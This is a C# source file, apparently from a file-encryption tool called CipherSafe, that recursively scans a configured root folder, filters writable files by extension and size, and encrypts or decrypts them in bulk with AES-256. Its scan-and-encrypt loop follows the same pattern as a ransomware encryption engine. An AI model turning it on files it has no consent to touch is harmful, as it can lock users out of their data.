// Copyright (C) PhcNguyen Developers
// Distributed under the terms of the Modified BSD License.

using System.Text;
using CipherSafe.Logging;
using System.Collections.Concurrent;

namespace CipherSafe.Application;

// Lớp FileExplorer để quét và xử lý các tệp tin
internal class FileExplorer
{
    private bool isRunning; 
    private readonly Logger logging;
    private readonly ParallelOptions parallelOptions;       // Cấu hình cho đa luồng
    private readonly HashSet<string> excludedDirectories;   // Các thư mục bị loại trừ
    private HashSet<string> fileExtensionsAllowed;          // Các định dạng file được phép

    public AesCipher aesCipher { get; private set; } // Đối tượng mã hóa
    private ConcurrentBag<FileDetail> SpecificFiles; // Danh sách các file cụ thể
    public List<FileDetail> filteredFiles;          // Danh sách các file đã lọc

    public FileExplorer()
    {
        this.isRunning = false; 
        this.logging = new Logger(); 
        this.aesCipher = new AesCipher(256); 
        this.filteredFiles = new List<FileDetail>(); 
        this.SpecificFiles = new ConcurrentBag<FileDetail>();
        this.fileExtensionsAllowed = Config.GetAllowedFileExtensions();
        this.excludedDirectories = new HashSet<string>(Config.GetSkippedFolders()); 
        this.parallelOptions = new ParallelOptions
        {
            MaxDegreeOfParallelism = Environment.ProcessorCount / 2 
        };
    }

    // Enum để xác định trạng thái có thể ghi của file
    private enum WritableStatus
    {
        Writable,     // Có thể ghi
        ReadOnly,     // Chỉ đọc
        NotExist,     // Không tồn tại
        Unauthorized, // Không có quyền truy cập
        IOError       // Lỗi I/O
    }

    // Phương thức kiểm tra trạng thái có thể ghi của file hoặc thư mục
    private WritableStatus IsWritable(string path)
    {
        try
        {
            if (File.Exists(path)) 
            {
                return new FileInfo(path).IsReadOnly 
                    ? WritableStatus.ReadOnly : WritableStatus.Writable;
            }
            else if (Directory.Exists(path)) 
            {
                return new DirectoryInfo(path).Attributes.HasFlag(FileAttributes.ReadOnly) 
                    ? WritableStatus.ReadOnly : WritableStatus.Writable; 
            }
        }
        catch (UnauthorizedAccessException) 
        {
            return WritableStatus.Unauthorized;
        }
        catch (IOException) 
        {
            return WritableStatus.IOError;
        }
        return WritableStatus.NotExist; 
    }

    // Phương thức làm sạch tên file để đảm bảo không có ký tự không hợp lệ
    private string CleanFileName(string originalFileName)
    {
        var invalidChars = Path.GetInvalidFileNameChars(); 
        var cleanedFileName = new StringBuilder(originalFileName.Length); 

        foreach (var c in originalFileName)
        {
            if (!invalidChars.Contains(c)) 
            {
                cleanedFileName.Append(c); 
            }
        }

        return cleanedFileName.ToString(); 
    }

    // Phương thức tìm kiếm các file trong thư mục
    private void FindFiles(string path)
    {
        try
        {
            if (fileExtensionsAllowed == null)
            {
                throw new ArgumentNullException(nameof(fileExtensionsAllowed), "File extensions must not be null.");
            }

            // Kiểm tra xem thư mục có bị loại trừ không
            if (excludedDirectories.Contains(path) || excludedDirectories.Any(path.StartsWith)) return;

            // Lấy danh sách các file trong thư mục hiện tại
            var files = Directory.EnumerateFiles(path)
                .Where(file => fileExtensionsAllowed.Contains(Path.GetExtension(file)))
                .AsParallel().WithDegreeOfParallelism(parallelOptions.MaxDegreeOfParallelism) 
                .Where(file => IsWritable(file) == WritableStatus.Writable)
                .ToList();

            Parallel.ForEach(files, this.parallelOptions, file =>
            {
                long fileSize = new FileInfo(file).Length; // Lấy kích thước file
                SpecificFiles.Add(new FileDetail(file, fileSize)); // Thêm vào danh sách
            });

            // Lấy danh sách các thư mục con
            var directories = Directory.EnumerateDirectories(path)
                .Where(dir => !excludedDirectories.Any(dir.StartsWith)) // Lọc các thư mục không bị loại trừ
                .ToList();

            // Gọi đệ quy để tìm file trong các thư mục con
            Parallel.ForEach(directories, FindFiles);
        }
        catch (UnauthorizedAccessException) // Bắt lỗi không có quyền truy cập
        {
            logging.Info($"Không có quyền truy cập vào {path}"); // Ghi log thông báo
        }
        catch (Exception ex) // Bắt lỗi chung
        {
            logging.Error("FindFiles", ex); // Ghi log lỗi
        }
    }

    private bool TryDecryptFile(string filePath, long fileSize, int maxRetries = 2, int delayMilliseconds = 500)
    {
        int attempt = 0;

        while (attempt < maxRetries)
        {
            try
            {
                aesCipher.DecryptFile(filePath, fileSize);
                return true;
            }
            catch (IOException ex) when (ex.Message.Contains("being used by another process"))
            {
                attempt++;
                logging.Warning($"Tệp đang bị khóa, thử lại {attempt}/{maxRetries} cho {filePath}...");
                Thread.Sleep(delayMilliseconds); // Đợi trước khi thử lại
            }
            catch (Exception ex)
            {
                logging.Error($"Lỗi không xác định khi giải mã tệp: {filePath}. {ex.Message}");
                return false; // Lỗi không thể phục hồi
            }
        }

        // Nếu thử lại quá nhiều lần mà không thành công, ghi log lỗi và trả về false
        logging.Error($"Không thể giải mã tệp {filePath} sau {maxRetries} lần thử.");
        return false;
    }


    /// <summary>
    /// Encrypts all files found during the scan.
    /// </summary>
    public void EncryptFilesMultiple()
    {
        int totalFiles = this.filteredFiles.Count; 
        int filesProcessed = 0; 

        var progressTask = Task.Run(() =>
        {
            while (filesProcessed < totalFiles)
            {
                // Draw progress bar on the console in a separate thread
                ProgressBar.drawText(filesProcessed, totalFiles);
                Thread.Sleep(100); 
            }
            // Final progress bar update once all files are processed
            ProgressBar.drawText(filesProcessed, totalFiles);
            Console.WriteLine();
        });

        // Encrypt each file using Parallel.ForEach
        Parallel.ForEach(this.filteredFiles, filteredFile =>
        {
            logging.Info($"ENC: {filteredFile.FilePath} - SIZE: {filteredFile.FormatSize()}");
            this.aesCipher.EncryptFile(filteredFile.FilePath, filteredFile.Size);

            // Increment the filesProcessed count
            Interlocked.Increment(ref filesProcessed);
        });

        // Wait for the progress task to finish
        progressTask.Wait(); 
    }

    public void DecryptFilesMultiple()
    {
        int totalFiles = this.filteredFiles.Count;
        int filesProcessed = 0;

        // Task chạy riêng để cập nhật tiến trình
        var progressTask = Task.Run(() =>
        {
            while (filesProcessed < totalFiles)
            {
                ProgressBar.drawText(filesProcessed, totalFiles);
                Thread.Sleep(100);
            }
            ProgressBar.drawText(filesProcessed, totalFiles);
            Console.WriteLine();
        });

        // Thực hiện giải mã các tệp trong danh sách với cơ chế thử lại
        Parallel.ForEach(this.filteredFiles, filteredFile =>
        {
            logging.Info($"DEC: {filteredFile.FilePath} - SIZE: {filteredFile.FormatSize()}");
            TryDecryptFile(filteredFile.FilePath, filteredFile.Size);
            Interlocked.Increment(ref filesProcessed);
        });
        progressTask.Wait();
    }

    // Enum để xác định thứ tự sắp xếp
    public enum SortOrder
    {
        /// <summary>
        /// Sort files in ascending order based on their size.
        /// </summary>
        Ascending,

        /// <summary>
        /// Sort files in descending order based on their size.
        /// </summary>
        Descending,

        /// <summary>
        /// Sort files in ascending order based on their name.
        /// </summary>
        ByNameAscending,

        /// <summary>
        /// Sort files in descending order based on their name.
        /// </summary>
        ByNameDescending
    }

    /// <summary>
    /// Scans for files larger than a specified size.
    /// </summary>
    /// <param name="minimumSize">Minimum file size to include in the results</param>
    /// <param name="sortOrder">Order in which to sort the results</param>
    /// <returns>List of FileDetail objects that match the criteria</returns>
    public void Scan(long minimumSize = 1024 * 1024, SortOrder sortOrder = SortOrder.Ascending,string fileType = "")
    {
        if (!isRunning) 
        {
            this.fileExtensionsAllowed.Add(".enc");
            FindFiles(Config.Root()); 
            isRunning = true; 
        }
        else { filteredFiles.Clear(); }

        
        var validFiles = this.SpecificFiles.Where(file => file.Size > minimumSize);
        if (fileType == ".dec")
        { validFiles = validFiles.Where(file => file.FileName.EndsWith(".enc", StringComparison.OrdinalIgnoreCase)); }
        else
        { validFiles = validFiles.Where(file => !file.FileName.EndsWith(".enc", StringComparison.OrdinalIgnoreCase)); }

        // Sắp xếp và chọn file theo sortOrder
        filteredFiles = sortOrder switch
        {
            SortOrder.Ascending => validFiles.OrderBy(file => file.Size).ToList(),
            SortOrder.Descending => validFiles.OrderByDescending(file => file.Size).ToList(),
            SortOrder.ByNameAscending => validFiles.OrderBy(file => file.FileName).ToList(),
            SortOrder.ByNameDescending => validFiles.OrderByDescending(file => file.FileName).ToList(),
            _ => throw new NotImplementedException() // Xử lý các thứ tự sắp xếp không hỗ trợ
        };
    }
}

// Lớp FileDetail để lưu trữ thông tin về file
internal class FileDetail
{
    public long Size { get; set; } // Kích thước file
    public string FilePath { get; set; } // Đường dẫn đến file
    public string FileName => Path.GetFileName(FilePath); // Tên file

    public FileDetail(string filePath, long size)
    {
        FilePath = filePath; // Khởi tạo đường dẫn file
        Size = size; // Khởi tạo kích thước file
    }

    // Phương thức định dạng kích thước file cho dễ đọc
    public string FormatSize()
    {
        return Size > 1024 ? $"{Size / 1024} KB" : $"{Size} B"; // Trả về kích thước tính bằng KB hoặc B
    }
}